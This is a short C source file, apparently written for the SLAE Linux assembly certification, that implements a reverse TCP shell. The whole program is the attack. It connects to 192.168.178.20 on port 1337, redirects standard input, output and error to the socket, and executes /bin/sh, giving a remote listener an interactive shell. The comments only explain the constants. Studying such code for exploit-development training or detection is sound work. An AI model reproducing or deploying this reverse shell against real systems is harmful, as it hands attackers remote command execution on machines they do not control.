/*
 * Title: Shell Reverse TCP (default Port: 1337 and
 *                           IP:   192.168.178.20)
 * Author: Dennis 'dhn' Herrmann
 * Website: https://zer0-day.pw
 * Github: https://github.com/dhn/SLAE/
 * SLAE-721
*/

#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT	1337
#define IP	"192.168.178.20"

#define STDIN	0
#define STDOUT	1
#define STDERR	2

int
main(void)
{
	int sockfd;
	struct sockaddr_in mysockaddr;

	mysockaddr.sin_family = AF_INET;            // 0x00000002
	mysockaddr.sin_port = htons(PORT);          // default: 1337
	mysockaddr.sin_addr.s_addr = inet_addr(IP); // default: 192.168.178.20

	/*
	 * $ grep /usr/include/AF_INET i386-linux-gnu/bits/socket.h
	 *   #define AF_INET		PF_INET
	 * $ grep grep SOCK_STREAM /usr/include/i386-linux-gnu/bits/socket_type.h
	 *   SOCK_STREAM = 1,		// Sequenced, reliable, connection-based
	*/
	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

	/*
	 * int connect(int sockfd,
	 *             const struct sockaddr *addr,
	 *             socklen_t addrlen);
	*/
	connect(sockfd, (struct sockaddr *)&mysockaddr, sizeof(mysockaddr));

	dup2(sockfd, STDIN);  // 0
	dup2(sockfd, STDOUT); // 1
	dup2(sockfd, STDERR); // 2

	execve("/bin/sh", NULL, NULL);

	return 0;
}
